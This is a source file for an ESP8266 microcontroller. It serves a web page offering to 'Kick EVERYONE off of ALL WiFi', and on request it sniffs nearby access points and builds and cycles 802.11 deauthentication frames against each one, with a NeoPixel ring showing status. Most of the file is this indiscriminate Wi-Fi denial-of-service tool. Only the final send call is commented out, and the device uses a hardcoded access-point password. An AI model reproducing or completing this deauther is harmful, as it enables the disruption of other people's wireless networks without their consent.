// Special thanks to suhajdab (https://gist.github.com/suhajdab)
// for making a simple NeoPixel twinkle code.
// Your methods have been used throughout this code
// and there is even a function with your twinkle code in it.

// Twinkle project: https://gist.github.com/suhajdab/9716028

// Connect to the "ResinIoT" WiFi network with password "ResinIoT"

#ifdef ESP8266
extern "C" {
#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "user_config.h"
#include "user_interface.h"
}
#endif

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266mDNS.h>
#include <ArduinoOTA.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPUpdateServer.h>
#include <Adafruit_NeoPixel.h>
#include <ArduinoJson.h>
#include "FS.h"

#define PIN D1 // Data pin
#define Pixels 12 // Number of pixels in the ring





//////////////////////////////////////////// LED Settings
Adafruit_NeoPixel strip = Adafruit_NeoPixel(Pixels, PIN, NEO_GRB + NEO_KHZ400);

// Ring types
float scanning[3] = {255, 6, 0};
float deauthing[3] = {255, 6, 0};
float serving[3] = {0, 170, 255};
float clicon[3] = {255, 255, 0};
float purple[3] = {255, 0, 255};

// Ring Settings
int ring_speed = 6; // (ms * fade_delay)
int fade_delay = 10; // ms
int max_interval = 10; // TIME BETWEEN PIXELS FIRING ((0 - x) * 10ms)

int current_itter = ring_speed;
int current_pixel = 0;
int current_fade_itter = 1;
bool increasing = true;
bool show_led = true;
float redStates[Pixels];
float blueStates[Pixels];
float greenStates[Pixels];
float fadeRate = 0.80;
String state = "deauthing";





//////////////////////////////////////////// WiFi Settings
ESP8266WebServer server(80); // Initialize web server
ESP8266HTTPUpdateServer httpUpdater;
const char* update_path = "/update";
String ssid = "ResinIoT";
String password = "ResinIoT";
bool deauth_on = false;





//////////////////////////////////////////// Deauther
const int size_lim = 50; // NUMBER OF ACCESS POINTS ALLOWED
const int channel_lim = 14; // NUMBER OF CHANNELS
int current = -1; // CURRENT NUMBER OF APs FOUND
int longest_essid = 0; // LENGTH OF THE LONGEST ESSID
int set_channel = 1; // STARTING CHANNEL
int channels[channel_lim] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14}; // LIST OF CHANNELS
//int channels[channel_lim] = {1, 11};
//////////////////////////////////////////// Deauther




//////////////////////////////////////////// Deauth
struct RxControl
{
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_CODING: 1;
  unsigned SGI: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};
 
struct LenSeq
{
  uint16_t length;
  uint16_t seq;
  uint8_t address3[6];
};
 
struct sniffer_buf
{
  struct RxControl rx_ctrl;
  uint8_t buf[36];
  uint16_t cnt;
  struct LenSeq lenseq[1];
};
 
struct sniffer_buf2
{
  struct RxControl rx_ctrl;
  uint8_t buf[112];
  uint16_t cnt;
  uint16_t len;
};
unsigned long time_ = 0;
unsigned long deauth_time = 0;
unsigned long deauth_cycle = 60000;

// CLASS TO BUILD ACCESS POINT OBJECTS
class AccessPoint
{
  public:
    String essid;
    signed rssi;
    uint8_t bssid[6];
    bool lim_reached = false;
    bool found = false; // VARIABLE FOR RE-SCAN
    int channel;
    int packet_limit = 500;
    int channels[14] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}; // ARRAY TO HELP DETERMINE ACTIVE CHANNEL
    // ARRAY TO STORE CLIENTS
    // int clients[20][6] = {};
    // THANKS spacehuhn
    uint8_t deauthPacket[26] = {
      /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,//reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
      /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
      /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
    };
};

AccessPoint access_points[size_lim];

//////////////////////////////////////////// Deauth













//////////////////////////////////////////// Web

String deauthHTML = "<center><span style=\"font-size: +34px\"/>Deauthing All WiFi Access Points</span></center><br><br>"
                    "<center><span style=\"font-size: +14px\"/>To end the attack, remove this device from its power source.</span></center>";

String responseHTML = "<title>HC</title>"
                      "<font face=\"Courier New\">"
                      "<style type=\"text/css\">"
                      "    #submit {"
                      "        background-color: #fff;"
                      "        padding: .5em;"
                      "        -moz-border-radius: 5px;"
                      "        -webkit-border-radius: 5px;"
                      "        border-radius: 6px;"
                      "        color: #000000;"
                      "        font-family: 'verdana';"
                      "        font-size: 20px;"
                      "        text-decoration: none;"
                      "        border: none;"
                      "    }"
                      "    #submit:hover {"
                      "        border: none;"
                      "        background: cyan;"
                      "        box-shadow: 0px 0px 1px #777;"
                      "  color: black;"
                      "    }"
                      "    body"
                      "    {"
                      "        color: #fff;"
                      "        background-color: #000000;"
                      "    }"
                      "    .topnav {"
                      "        background-color: #2f3136;"
                      "        border-left: solid #c10000 5px;"
                      "        border-radius: 3px;"
                      "        overflow: hidden;"
                      "    }"
                      "    .topnav a {"
                      "        float: left;"
                      "        color: #bfbfbb;"
                      "        text-align: center;"
                      "        padding: 4px 10px;"
                      "        text-decoration: none;"
                      "        font-size: 17px;"
                      "        border-radius: 3px;"
                      "        margin-top: 0.5rem;"
                      "        margin-left: 0.5rem;"
                      "        margin-right: 0.5rem;"
                      "        margin-bottom: 0.5rem;"
                      "    }"
                      "    .topnav a:hover {"
                      "        background-color: #c10000;"
                      "        color: black;"
                      "    }"
                      "    .topnav-right {"
                      "        float: right;"
                      "    }"
                      "    h1 {"
                      "        font-size: 1.7rem;"
                      "        margin-top: 1rem;"
                      "        margin-left: auto;"
                      "        margin-right: auto;"
                      "        background: #2f3136;"
                      "        color: #bfbfbb;"
                      "        padding: 0.2em 1em;"
                      "        border-radius: 3px;"
                      "        border-left: solid #c10000 5px;"
                      "        font-weight: 100;"
                      "    }"
                      "    h2 {"
                      "        font-size: 1rem;"
                      "        margin-top: 1rem;"
                      "        margin-left: auto;"
                      "        margin-right: auto;"
                      "        background: #2f3136;"
                      "        color: #bfbfbb;"
                      "        padding: 0.2em 1em;"
                      "        border-radius: 3px;"
                      "        border-left: solid #c10000 5px;"
                      "        font-weight: 100;"
                      "    }"
                      "    h3 {"
                      "        font-size: 1rem;"
                      "        margin-top: 1rem;"
                      "        margin-left: auto;"
                      "        margin-right: auto;"
                      "        background: #ffe500;"
                      "        color: #000000;"
                      "        padding: 0.2em 1em;"
                      "        border-radius: 3px;"
                      "        font-weight: 100;"
                      "    }"
                      "    .column {"
                      "        margin-left: 5rem;"
                      "        margin-right: 5rem;"
                      "    }"
                      "    .column input {"
                      "        float: right;"
                      "        margin-top: 0.5rem;"
                      "        background: transparent;"
                      "        color: #bfbfbb;"
                      "        outline: 0;"
                      "        border: 0;"
                      "        border-bottom: solid #c10000 2px;"
                      "        font-size: 14px;"
                      "    }"
                      "    .column input {"
                      "        clear: both;"
                      "    }"
                      "    .column span {"
                      "        margin-top: 0.5rem;"
                      "        display: inline-block;"
                      "    }"
                      "    .column about {"
                      "      font-size: +12px;"
                      "    }"
                      "    "
                      "    .prefix {"
                      "      display: flex;"
                      "        justify-content: space-between;"
                      "    }"
                      "    "
                      "    hr {"
                      "      border-color: #2f3136;"
                      "        background-color: #2f3136;"
                      "        height: 2px;"
                      "        border: none;"
                      "    }"
                      "</style>"
                      "<br>"
                      "<html><body>"
                      "    <div style='margin-top: 25%' class=\"column\">"
                      "        <form name=\"submit\" method=\"get\">"
                      "            <span style='font-size: +24px'/>Kick <b>EVERYONE</b> off of <b>ALL</b> WiFi</span>\n"
                      "            <input type='radio' name='action' value='shutdown_wifi'>"
                      "            <br><br>"
                      "            <span style='font-size: +24px'/>LED Ring On</span>\n"
                      "            <input type='radio' name='action' value='on'>"
                      "            <br><br>"
                      "            <span style='font-size: +24px'/>LED Ring Off</span>\n"
                      "            <input type='radio' name='action' value='off'>"
                      "            <br><br>"
                      "            <input type='submit' id='submit' value='Apply'>"
                      "        </form>"
                      "    </div>"
                      "</body></html>";
//////////////////////////////////////////// Web





//////////////////////////////////////////// Web


// Function to tell server how to behave for each address
// No args
// No Return
void SetServerBehavior()
{  
  if (!MDNS.begin((const char*)ssid.c_str()))
  {
    Serial.println("Could not configure mDNS");
    return;
  }
  
  httpUpdater.setup(&server);
  server.on("/", HandleClient);

  MDNS.update();
  
  server.begin();

  MDNS.addService("http", "tcp", 80);
}





// Function to start an AP if it cant connect to one
// SSID and Password Args
// Return start AP bool
bool startAP()
{
  Serial.println("Configuring Access Point...");
  WiFi.mode(WIFI_AP);
  WiFi.softAP((const char*)ssid.c_str(), (const char*)password.c_str());

  IPAddress myIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(myIP);

  SetServerBehavior();

  return true;
}




// Function to handle JSON API post data
// No Args
// No Return
void HandleClient()
{
  if (server.args() > 0)
  {
    deauth_on = false;
    
    Serial.println("Server arguments received");
    
    for (uint8_t i = 0; i < server.args(); i++)
    {
      if (server.argName(i) == "action" && server.arg(i).length() > 0)
      {
        Serial.print("Shutdown WiFi?: ");
        Serial.println(server.arg(i));
        if (server.arg(i) == "shutdown_wifi")
        {
          server.send(200, "text/html", deauthHTML);
          RunDeauthSetup();
          deauth_on = true;
        }
        else if (server.arg(i) == "on")
          show_led = true;
        else if (server.arg(i) == "off")
        {
          show_led = false;
          ResetWheel();
        }
      }
    }
  }
  server.send(200, "text/html", responseHTML);
}


//////////////////////////////////////////// Web

















//////////////////////////////////////////// Deauther

void send_deauth(AccessPoint access_point)
{
  // SET CHANNEL TO AP CHANNEL
  wifi_set_channel(access_point.channel);
  delay(1);
  
  // SEND DEAUTH PACKET
  //wifi_send_pkt_freedom(access_point.deauthPacket, 26, 0);
}

// FUNCTION TO ADD NEW APs TO THE MASTER LIST OF APs
bool add_access_point(uint8_t bssid[6], int channel, String essid, signed rssi)
{
  bool limit_reached = false;
  bool found = false;
  bool byte_match;
  int largest = 0;

  // CHECK IF WE ALREADY HAVE THE ACCESS POINT
  for (int i = 0; i < current + 1; i++)
  {
    byte_match = false;
    for (int p = 0; p < 6; p++)
    {
      if (access_points[i].bssid[p] == bssid[p])
        byte_match = true;
      else
      {
        byte_match = false;
        break;
      }
    }

    // IF WE GET A REPEAT BEACON, UPDATE ITS OBJECT
    if (byte_match == true)
    {
      // MARK IT AS FOUND
      access_points[i].found = true;
      if (access_points[i].lim_reached == false)
      {
        access_points[i].channels[channel - 1]++;
        if (access_points[i].channels[channel - 1] >= access_points[i].packet_limit)
        {
          access_points[i].lim_reached = true;
        }
        for (int c = 1; c < 15; c++)
        {
          if (access_points[i].channels[c - 1] >= access_points[i].channels[largest])
          {
            largest = c - 1;
          }
        }
        if (access_points[i].channel != largest + 1)
        {
          access_points[i].channel = largest + 1;
          Serial.print(access_points[i].essid);
          Serial.print(" -> Updated channel: ");
          Serial.println(access_points[i].channel);
        }
      }
      found = true;
      break;
    }
  }

  // IF THE ACCESS POINT WASN'T ALREADY THERE, ADD IT
  if (found == true)
    return false;
  else
  {
    // BUILD THE OBJECT
    current++;
    if (current == size_lim)
      current = 0;
      
    AccessPoint access_point;
    access_point.channel = channel;
    access_point.channels[channel - 1]++;
    access_point.essid = essid;
    access_point.rssi = rssi;
    access_point.found = true;
    for (int i = 0; i < 6; i++)
    {
      access_point.bssid[i] = bssid[i];
      access_point.deauthPacket[i + 10] = bssid[i];
      access_point.deauthPacket[i + 16] = bssid[i];
    }
    access_points[current] = access_point;

    if (access_point.essid.length() > longest_essid)
      longest_essid = access_point.essid.length();
    
    return true;
  }
}





// FUNCTION TO PRINT THE FULL LIST OF ACCESS POINTS
// EVERY TIME A NEW ONE IS ADDED
void print_aps()
{
  
  Serial.println("-----------------------------");

  
  for (int i = 0; i < current + 1; i++)
  {
    for (int x = 0; x < longest_essid - access_points[i].essid.length(); x++)
      Serial.print(" "); 
    Serial.print(access_points[i].essid);
    Serial.print(" -> ");
    for (int p = 0; p < 6; p++)
    {
      if (p != 5)
        Serial.printf("%02x ", access_points[i].bssid[p]);
      else
        Serial.printf("%02x", access_points[i].bssid[p]);
    }
    Serial.print(" | CH: ");
    Serial.print(access_points[i].channel);
    Serial.print(" | RSSI: ");
    Serial.printf("%2d | ", access_points[i].rssi);
    for (int c = 0; c < 14; c++)
    {
      Serial.print(access_points[i].channels[c]);
      Serial.print(", ");
    }
    Serial.print("\n");
  }
  Serial.println("-----------------------------");
}




// SNIFFER CALLBACK FUNCTION
void ICACHE_FLASH_ATTR promisc_cb(uint8 *buf, uint16 len)
{
  bool limit_reached = false;
  bool found = false;
  bool byte_match;
  int largest = 0;
  
  // CONTROL
  String local_essid = "";
  
  if (len == 12)
    struct RxControl *sniffer = (struct RxControl*) buf;
  
  // I GUESS THIS IS BEACON LENGTH
  else if (len == 128) // 173 or 37
  { 
    bool beacons = true;

    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;

    if (sniffer->buf[0] == 0x80)
    {
      // LOAD BSSID OF PACKET
      uint8_t byte_arr[6];
      for (int i = 0; i < 6; i++)
      {
        byte_arr[i] = sniffer->buf[i + 10];
      }

      for (int i = 0; i < sniffer->buf[37]; i++)
        local_essid.concat((char)sniffer->buf[i + 38]);
        
      if (add_access_point(byte_arr, set_channel, local_essid, sniffer->rx_ctrl.rssi))
      {
        Serial.print("Beacon -> ");

  
        // BEACON SIZE BYTE IS LOCATED AT 37
        // BEACON ESSID STARTS AT BYTE 38
        for (int i = 0; i < sniffer->buf[37]; i++)
        {
          // PRINT THE ESSID HEX CONVERTED TO CHAR
          Serial.print((char)sniffer->buf[i + 38]);
        }
        Serial.print("\n");
        //print_aps();
      }
    }

  }

  // THIS IS DATA
  else
  {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
    
    // CHECK IF WE ALREADY HAVE THE ACCESS POINT
    for (int i = 0; i < current + 1; i++)
    {
      byte_match = false;

      // CHECK IF SOURCE IS AP
      for (int p = 0; p < 6; p++)
      {
        if (access_points[i].bssid[p] == sniffer->buf[p + 10])
          byte_match = true;
        else
        {
          byte_match = false;
          break;
        }
      }

      // CHECK IF DESTINATION IS AP
      for (int p = 0; p < 6; p++)
      {
        if (access_points[i].bssid[p] == sniffer->buf[p + 4])
          byte_match = true;
        else
        {
          byte_match = false;
          break;
        }
      }
  
      // IF WE GET A REPEAT BEACON, UPDATE ITS OBJECT
      if (byte_match == true)
      {
        if (access_points[i].lim_reached == false)
        {
          access_points[i].channels[set_channel - 1]++;
          if (access_points[i].channels[set_channel - 1] >= access_points[i].packet_limit)
          {
            access_points[i].lim_reached = true;
          }
        }
      }
    }
  }
  /*
  else
  {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;

    Serial.printf("%02x | ", sniffer->buf[0]);

    // PRINT SOURCE ADDR
    for (int p = 0; p < 6; p++)
    {
      Serial.printf("%02x ", sniffer->buf[p + 10]);
    }

    Serial.print(" -> ");

    // PRINT DEST ADDR
    for (int p = 0; p < 6; p++)
    {
      Serial.printf("%02x ", sniffer->buf[p + 4]);
    }
    
    Serial.printf(" || RSSI: %2d (%d ms)\n", sniffer->rx_ctrl.rssi, millis() - time_);
    time_ = millis();
  }
  */
}




// FUNCTION TO SHOW THE DEAUTH PACKETS THAT WILL BE TRANSMITTED
void show_deauth()
{
  
  Serial.print("Deauthenticating clients from ");
  Serial.print(current + 1);
  Serial.println(" access points");
  Serial.println("-----------------------------");
  for (int i = 0; i <= current; i++)
  {
    Serial.print(access_points[i].channel);
    Serial.print(" | ");
    Serial.print(access_points[i].essid);
    Serial.print(" -> ");
    for (int p = 0; p < 6; p++)
      Serial.printf("%02x ", access_points[i].deauthPacket[p + 10]);
    Serial.print("\n");
  }
  Serial.println("-----------------------------");
}




// VOID TO MOVE DEAD AP TO END OF LIST AND ADJUST CURRENT
void remove_element(int index)
{
  AccessPoint temp = access_points[index];
  Serial.print("[!] Not found in scan | Removing -> ");
  Serial.println(temp.essid);
  access_points[index] = access_points[current];
  access_points[current] = temp;
  current--;
  Serial.print("[!] New Current -> ");
  Serial.println(current);
}

void clean_ap_list()
{
  Serial.println("[!] Cleaning AP list...");
  for (int i = 0; i <= current; i++)
  {
    if (access_points[i].found == false)
      remove_element(i);
  }
}




// FUNCTION TO SCAN FOR ACCESS POINTS
void scan()
{
  state = "scanning";
  ResetWheel();
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(promisc_cb);
  wifi_promiscuous_enable(1);
  Serial.println("[!] Scanning for APs...");

  for (int i = 0; i <= current; i++)
    access_points[i].found = false;
  
  for (int i = 0; i < 2; i++)
  {
    for (int p = 0; p < channel_lim; p++)
    {
      set_channel = channels[p];
      wifi_set_channel(set_channel);
      for (int j = 0; j < 1000; j++)
      {
        if (state == "scanning")
        {
          fade_delay = 10;
          fadeRate = 0.80;
          LoadRing(scanning[0], scanning[1], scanning[2]);
        }
        delay(1);
      }
    }
    Serial.println("[!] Completed one scan");
  }
  Serial.println("[!] Done scanning");
  clean_ap_list();
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(0);
  wifi_promiscuous_enable(1);
  ResetWheel();
}




void RunDeauthSetup()
{
  Serial.begin(2000000);
  Serial.println("[!] WiFi Deauther");
  Serial.println("[!] Initializing...\n\n");
  //server.stop();
  WiFi.mode(WIFI_OFF);
  wifi_set_opmode(0x1);
  wifi_set_channel(set_channel);
  //wifi_promiscuous_enable(0);
  //wifi_set_promiscuous_rx_cb(promisc_cb);
  //wifi_promiscuous_enable(1);
  Serial.println("[!] Init finished\n\n");
  time_ = millis();

  // DO 2 SCANS
  scan();
  deauth_time = millis();
  Serial.print("Current time -> ");
  Serial.print(deauth_time);
  Serial.println("ms");
  //wifi_promiscuous_enable(0);
  //wifi_set_promiscuous_rx_cb(0);
  //wifi_promiscuous_enable(1);

  show_deauth();
}



void RunDeauth()
{
  if (millis() - deauth_time > deauth_cycle)
  {
    Serial.print("Deauth ");
    Serial.print(deauth_cycle);
    Serial.println("ms mark");
    scan();
    show_deauth();
    deauth_time = millis();
  }
  state = "deauthing";
  for (int i = 0; i <= current; i++)
  {
    if (state == "deauthing")
    {
      fade_delay = 20;
      fadeRate = 0.90;
      PulseRing(deauthing[0], deauthing[1], deauthing[2]);
    }
    send_deauth(access_points[i]);
  }
  //Serial.println("Deauthed");
  delay(1);
}

//////////////////////////////////////////// Deauther
















//////////////////////////////////////////// LED
void LoadRing(int r, int g, int b)
{
  if (show_led)
  {
    current_itter++;
    if (current_itter >= ring_speed * fade_delay)
    {   
      current_itter = 0;
      current_pixel++;
      if (current_pixel >= Pixels)
        current_pixel = 0;
        
      uint16_t i = current_pixel;
      if (redStates[i] < 1 && greenStates[i] < 1 && blueStates[i] < 1) {
        redStates[i] = r;
        greenStates[i] = g;
        blueStates[i] = b;
      }
    }
  
    if (current_fade_itter > fade_delay)
    {
      current_fade_itter = 1;
      
      for(uint16_t l = 0; l < Pixels; l++) {
        if (redStates[l] > 1 || greenStates[l] > 1 || blueStates[l] > 1) {
          strip.setPixelColor(l, redStates[l], greenStates[l], blueStates[l]);
          
          if (redStates[l] > 1) {
            redStates[l] = redStates[l] * fadeRate;
          } else {
            redStates[l] = 0;
          }
          
          if (greenStates[l] > 1) {
            greenStates[l] = greenStates[l] * fadeRate;
          } else {
            greenStates[l] = 0;
          }
          
          if (blueStates[l] > 1) {
            blueStates[l] = blueStates[l] * fadeRate;
          } else {
            blueStates[l] = 0;
          }
          
        } else {
          strip.setPixelColor(l, 0, 0, 0);
        }
      }
    }
    //strip.setPixelColor(0, 0, 255, 0);
    //strip.setPixelColor(11, 255, 0, 0);
    strip.show();
    
    current_fade_itter++;
    
    //delay(10);
  }
}

void PulseRing(int r, int g, int b)
{
  if (show_led)
  {
    float modifier = 0;
    
    if (current_fade_itter > fade_delay)
    {
      if (increasing)
        modifier = 2 - fadeRate;
      else
        modifier = fadeRate;
  
      for(uint16_t l = 0; l < Pixels; l++)
      {
        redStates[l] = redStates[l] * modifier;
        
  
        greenStates[l] = greenStates[l] * modifier;
  
        
        blueStates[l] = blueStates[l] * modifier;
  
        if (redStates[l] < 1 && greenStates[l] < 1 && blueStates[l] < 1)
        {
          increasing = true;
          redStates[l] = r * 0.0037;
          greenStates[l] = g * 0.0037;
          blueStates[l] = b * 0.0037;
        }
        else if (redStates[l] >= 255 || greenStates[l] >= 255 || blueStates[l] >= 255)
        {
          increasing = false;
          redStates[l] = r;
          greenStates[l] = g;
          blueStates[l] = b;
        }
        
        strip.setPixelColor(l, redStates[l], greenStates[l], blueStates[l]);
      }
      
      current_fade_itter = 0;
  
      /*
      Serial.print(redStates[0]);
      Serial.print(" ");
      Serial.print(greenStates[0]);
      Serial.print(" ");
      Serial.println(blueStates[0]); 
      */   
    }
    
    current_fade_itter++;
    
    strip.show();
  }
}

void Twinkle()
{
  if (show_led)
  {
    current_itter++;
    if (current_itter >= ring_speed)
    {
      current_itter = 0;
  
      if (random(max_interval) == 1) {
        uint16_t i = random(Pixels);
        if (redStates[i] < 1 && greenStates[i] < 1 && blueStates[i] < 1) {
          redStates[i] = random(256);
          greenStates[i] = random(256);
          blueStates[i] = random(256);
        }
      }
    }
  
    if (current_fade_itter > fade_delay)
    {
      current_fade_itter = 1;
      for(uint16_t l = 0; l < Pixels; l++) {
        if (redStates[l] > 1 || greenStates[l] > 1 || blueStates[l] > 1) {
          strip.setPixelColor(l, redStates[l], greenStates[l], blueStates[l]);
          
          if (redStates[l] > 1) {
            redStates[l] = redStates[l] * fadeRate;
          } else {
            redStates[l] = 0;
          }
          
          if (greenStates[l] > 1) {
            greenStates[l] = greenStates[l] * fadeRate;
          } else {
            greenStates[l] = 0;
          }
          
          if (blueStates[l] > 1) {
            blueStates[l] = blueStates[l] * fadeRate;
          } else {
            blueStates[l] = 0;
          }
          
        } else {
          strip.setPixelColor(l, 0, 0, 0);
        }
      }
    }
    current_fade_itter++;
    strip.show();
    //delay(10);
  }
}

void ResetWheel()
{
  for(uint16_t l = 0; l < Pixels; l++) {
    redStates[l] = 0;
    greenStates[l] = 0;
    blueStates[l] = 0;
    strip.setPixelColor(l, redStates[l], greenStates[l], blueStates[l]);
  }
  strip.show();
}



void setup() {
  strip.begin();
  strip.show(); // Initialize all pixels to 'off'

  Serial.begin(2000000);

  Serial.println("\nResinIot");
  
  ResetWheel();

  startAP();
}

void loop () {    
  if (state == "scanning")
  {
    fade_delay = 10;
    fadeRate = 0.80;
    LoadRing(scanning[0], scanning[1], scanning[2]);
  }
  else if (state == "deauthing")
  {
    fade_delay = 20;
    fadeRate = 0.90;
    PulseRing(deauthing[0], deauthing[1], deauthing[2]);
  }
  else if (state == "serving")
  {
    fade_delay = 20;
    fadeRate = 0.90;
    PulseRing(serving[0], serving[1], serving[2]);
  }
  else if (state == "clicon")
  {
    fade_delay = 20;
    fadeRate = 0.90;
    PulseRing(clicon[0], clicon[1], clicon[2]);
  }
  else if (state == "idle")
  {
    fade_delay = 20;
    fadeRate = 0.80;
    Twinkle();
  }
  else if (state == "off")
  {
    ResetWheel();
    strip.show();
  }
  
  if (!deauth_on)
  {
    if (wifi_softap_get_station_num() < 1)
      state = "serving";
    else
      state = "clicon";
      
    server.handleClient();
    delay(1);
  }
  else
    RunDeauth();
}
